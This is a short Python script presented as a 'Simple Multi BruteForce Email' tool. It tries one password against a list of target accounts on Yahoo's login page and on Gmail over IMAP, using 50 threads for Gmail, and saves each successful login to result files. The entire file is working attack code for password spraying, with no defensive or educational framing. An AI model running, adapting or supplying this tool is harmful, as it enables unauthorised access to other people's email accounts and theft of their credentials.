try:
	import mechanize,os,sys,requests,time,email,imaplib
	from multiprocessing.pool import ThreadPool
	try:
		os.mkdir('result')
	except: pass

	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 5.1)")]

	Y=[]
	G=[]
	def yahoo(user):
		try:
			br.open('https://login.yahoo.com')
			br.select_form(nr=0)
			br.form['username']=user
			br.submit()
			br._factory.is_html=True
			br.select_form(nr=0)
			br.form['password']=pas
			res=br.submit().read()
			if 'logout' in str(res):
				sts='ntaps'
				Y.append(sts)
				print("[found] %s => %s"%(user,pas))
				tls=("[YAHOO] %s => %s\n"%(user,pas))
				fil=open('result/Yahoo.txt','a')
				fil.write(tls)
				fil.close()
			else: print("[not]",user)
		except KeyboardInterrupt: exit("[exit] key interrupt")
		except: print("[err]",user)

	def gmail(arg):
		try:
			m = imaplib.IMAP4_SSL("imap.gmail.com",993)
			rc, resp = m.login(arg,pas)
			sts='ntaps'
			G.append(sts)
			print("[+] "+str(resp).replace('b',''))
			wrt="[GMAIL] %s => %s\n"%(arg,pas)
			fil3=open('result/Gmail.txt','a')
			fil3.write(wrt)
			fil3.close()
		except: print("[-] ["+arg+" (failuer)]")

	os.system('clear')
	print("""
	[Simple Multi BruteForce Email]
	        [By:KANG-NEWBIE]
1. Brute Yahoo
2. Brute Gmail
	""")
	pil=int(input("/kang-newbie_> "))
	try:
		file=open(input("\n[?] Id List Target: ")).read().splitlines()
		pas=input("[?] Password to Crack: ")
	except (KeyboardInterrupt,EOFError):
		exit("\n[!] Key interrupt: Exiting.")
	except FileNotFoundError:
		exit("\n[!] File not found: Exiting.")

	usr=[]
	for x in file:
		usr.append(x)
	if pil == 1:
		for i in usr:
			yahoo(i)
		if 'ntaps' in str(Y):
			print("[!] Found ["+str(len(Y))+"]")
			print("[!] file saved: result/Yahoo.txt")
		else: print("[:'(] noting found")
	elif pil == 2:
		p=ThreadPool(50)
		p.map(gmail,usr)
		if 'ntaps' in str(G):
			print("[!] Found ["+str(len(G))+"]")
			print("[!] file saved: result/Gmail.txt")
		else: print("[:'(] nothing found")

except KeyboardInterrupt: exit("[exit] key interrupt")
except Exception as F:
	print("\nErr: %s"%(F))